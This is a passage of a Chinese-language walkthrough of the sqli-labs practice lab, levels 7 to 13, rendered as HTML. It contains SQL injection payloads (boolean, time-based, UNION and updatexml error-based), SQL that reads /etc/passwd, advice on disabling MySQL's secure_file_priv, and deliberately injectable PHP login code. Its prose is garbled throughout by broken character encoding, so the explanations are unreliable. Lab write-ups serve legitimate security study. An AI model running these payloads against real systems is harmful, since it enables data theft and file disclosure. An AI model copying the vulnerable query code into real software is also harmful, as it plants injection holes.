class="string">&#x27;%secure%&#x27;</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200313233757.png" style="zoom:80%;"><p>åœ¨mysql 5.6.34ç‰ˆæœ¬ä»¥å secure_file_privçš„å€¼é»˜è®¤ä¸ºNULLã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ä¿®æ”¹</p><p>ä¿®æ”¹mysql.ini æ–‡ä»¶ï¼Œåœ¨[mysqld] ä¸‹æ·»åŠ æ¡ç›®: <code>secure_file_priv =</code></p><p>ä¿å­˜ï¼Œé‡å¯mysqlã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#å€¼ä¸ºnull ï¼Œä¹Ÿå°±æ˜¯æ³¨é‡Šæ‰è¿™ä¸ªå‚æ•°æˆ–è€…secure-file-priv&#x3D;nullã€‚è¡¨ç¤ºé™åˆ¶mysqld ä¸å…è®¸å¯¼å…¥|å¯¼å‡º</span><br><span class="line">#å€¼ä¸º&#x2F;tmp&#x2F; ï¼Œå³secure-file-priv&#x3D;&quot;&#x2F;tmp&#x2F;&quot; è¡¨ç¤ºé™åˆ¶mysqld çš„å¯¼å…¥|å¯¼å‡ºåªèƒ½å‘ç”Ÿåœ¨&#x2F;tmp&#x2F;ç›®å½•ä¸‹</span><br><span class="line">#æ²¡æœ‰å…·ä½“å€¼æ—¶ï¼Œå³secure-file-priv&#x3D;      è¡¨ç¤ºä¸å¯¹mysqld çš„å¯¼å…¥|å¯¼å‡ºåšé™åˆ¶</span><br></pre></td></tr></table></figure><h3 id="è¯»æ–‡ä»¶"><a href="#è¯»æ–‡ä»¶" class="headerlink" title="è¯»æ–‡ä»¶"></a>è¯»æ–‡ä»¶</h3><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥è¯»æ–‡ä»¶</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(cmd <span class="built_in">text</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(cmd) <span class="keyword">values</span> (<span class="keyword">load_file</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç”¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">&#x27;/etc/passwd&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> test.test <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">&#x27;\n&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="å…³é”®ä»£ç -6"><a href="#å…³é”®ä»£ç -6" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=((&#x27;<span class="subst">$id</span>&#x27;)) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in.... Use outfile......&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You have an error in your SQL syntax&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯boolç›²æ³¨ï¼Œå½“ç„¶ä¹Ÿå¯ç”¨æ—¶é—´ç›²æ³¨ï¼Œèƒ½ç”¨boolå°½é‡ç”¨ï¼Œé€Ÿåº¦æ¯”è¾ƒå¿«</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(0,1,0)%23</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªurlè¿”å›çš„ç»“æœä¸ä¸€æ ·ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨ifçš„ç¬¬ä¸€ä¸ªå‚æ•°æ³¨å…¥</p><h3 id="å…³é”®ä»£ç -7"><a href="#å…³é”®ä»£ç -7" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>é¢˜ç›®è€ƒå¯Ÿçš„æ˜¯æ—¶é—´ç›²æ³¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; and if(0,sleep(3),0)%23</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="number">1</span>,sleep(<span class="number">3</span>),<span class="number">0</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>å’ŒLess-8å·®ä¸å¤šçš„payloadï¼Œè¿™é¢˜ä¸èƒ½ç”¨boolç›²æ³¨çš„åŸå› æ˜¯ä¸¤ç§è¯·æ±‚è¿”å›çš„ç»“æœä¸€æ ·ï¼Œæ— æ³•æ ¹æ®é¡µé¢å†…å®¹åˆ¤æ–­æ˜¯å¦sqlè¯­å¥æ˜¯å¦æ°å¥½æ»¡è¶³æ¡ä»¶</p><h3 id="å…³é”®ä»£ç -8"><a href="#å…³é”®ä»£ç -8" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>è¿˜æ˜¯æ—¶é—´ç›²æ³¨ï¼Œåªä¸è¿‡éœ€è¦ç”¨<code>&quot;</code>é—­åˆ</p><h3 id="å…³é”®ä»£ç -9"><a href="#å…³é”®ä»£ç -9" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span>.$id.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>POSTæ³¨å…¥ï¼Œå’ŒLess-1å·®ä¸å¤šï¼Œåªæ˜¯æ¥æ”¶å‚æ•°çš„æ–¹å¼ä¸åŒï¼Œorder byåˆ¤æ–­åˆ—æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POSTuname=admin<span class="string">&#x27; order by 2%23&amp;passwd=aaa&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡å“åº”é•¿åº¦çš„ä¸åŒå¯ä»¥åˆ¤æ–­æœ‰ä¸¤åˆ—</p><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200427154216.png" style="zoom:80%;"><p>è”åˆæŸ¥è¯¢ï¼Œå›æ˜¾åœ¨ç™»é™†ä¹‹åç•Œé¢ä¸Š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POSTuname=asdf<span class="string">&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;passwd=aaa&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200427155905.png" style="zoom:80%;"><p>æ¥ç€åˆæ˜¯çˆ†å­—æ®µï¼Œçˆ†å†…å®¹é‚£ç§äº†</p><p>ä¹Ÿå¯ä»¥æŠ¥é”™æ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POSTuname=asdf<span class="string">&#x27; and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd=aaa&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200427160321.png" style="zoom:67%;"><h3 id="å…³é”®ä»£ç -10"><a href="#å…³é”®ä»£ç -10" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>å’ŒLess-11å·®ä¸å¤šï¼Œé—­åˆæ–¹å¼ä¸åŒè€Œå·²ï¼ŒåŠ ä¸ªå•æˆ–åŒå¼•å·è¯•è¯•ï¼Œä»æŠ¥é”™ä¿¡æ¯å°±èƒ½çŒœå‡ºåå°sqlè¯­å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&quot;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br><span class="line"></span><br><span class="line">the right syntax to use near &#39;bbb&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>çŒœæµ‹æˆ‘ä»¬åŠ çš„<code>&quot;</code>ä¸å‰é¢çš„é—­åˆï¼Œæœ¬æ¥æœ‰çš„å½±å“åé¢çš„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=(<span class="string">&quot;aaa&quot;&quot;) and password=(&quot;</span>bbb<span class="string">&quot;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=aaa<span class="string">&quot;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&amp;passwd=sad&amp;submit=Submit</span></span><br></pre></td></tr></table></figure><p>æ¥ç€å°±å’ŒLess-11å·®ä¸å¤šäº†</p><h3 id="å…³é”®ä»£ç -11"><a href="#å…³é”®ä»£ç -11" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$uname=<span class="string">&#x27;&quot;&#x27;</span>.$uname.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$passwd=<span class="string">&#x27;&quot;&#x27;</span>.$passwd.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>è¿˜æ˜¯åŠ å•åŒå¼•å·è®©å®ƒæŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;aaa&#39;&amp;passwd&#x3D;bbb&amp;submit&#x3D;Submit</span><br><span class="line"> </span><br><span class="line">the right syntax to use near &#39;bbb&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>çŒœæµ‹æˆ‘ä»¬åŠ çš„<code>&#39;</code>ä¸å‰é¢çš„é—­åˆï¼Œæœ¬æ¥æœ‰çš„å½±å“åé¢çš„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=(<span class="string">&#x27;aaa&#x27;&#x27;) and password=(&#x27;</span>bbb<span class="string">&#x27;) LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå¥½åƒæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½æŠ¥é”™å’Œç›²æ³¨ä¸¤ç§äº†</p><p>å…ˆçœ‹æŠ¥é”™ï¼Œæ„é€ </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin&#39;)  and updatexml(1,concat(0x3a,(select user())),1)%23&amp;passwd&#x3D;dsa&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200427165732.png" style="zoom:80%;"><p>å†çœ‹çœ‹ç›²æ³¨ï¼Œå¯ä»¥ç”¨boolç›²æ³¨,æ ¹æ®é•¿åº¦çš„ä¸åŒåˆ¤æ–­ï¼Œæ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin<span class="string">&#x27;) and substr((select database()),1,1)=&#x27;</span>s<span class="string">&#x27;%23&amp;passwd=dsa&amp;submit=Submit</span></span><br><span class="line"><span class="string">æˆ–</span></span><br><span class="line"><span class="string">uname=aaa&#x27;</span>) <span class="keyword">or</span> substr((select database()),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>%<span class="number">23</span>&amp;passwd=bbb&amp;submit=Submit</span><br></pre></td></tr></table></figure><p>æ³¨æ„å¦‚æœunameç”¨admin,å³è¡¨é‡Œé¢å­˜åœ¨çš„å€¼ä¸­é—´å°±ä¸èƒ½ç”¨orï¼Œåé¢çš„ä¼šä¸æ‰§è¡Œï¼Œå¹¶ä¸”sleep(3)æ‰§è¡Œä¹‹åè¿”å›0</p><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200427173016.png" style="zoom:80%;"><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200427171110.png" style="zoom: 80%;"><p>å¦‚æœå‰é¢çš„æ˜¯0ï¼Œæˆ‘ä»¬å†è¯•ä¸‹</p><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200427172831.png" style="zoom: 80%;"><p>ä½†æ˜¯æˆ‘å‘ç°æŠ¥é”™æ³¨å…¥å¥½åƒæ²¡è¿™ä¸ªé™åˆ¶</p><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200427171228.png" style="zoom:80%;"><h3 id="å…³é”®ä»£ç -12"><a href="#å…³é”®ä»£ç -12" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">&quot;SELECT username, password FROM users WHERE username=(&#x27;<span class="subst">$uname</span>&#x27;) and password=(&#x27;<span class="subst">$passwd</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span 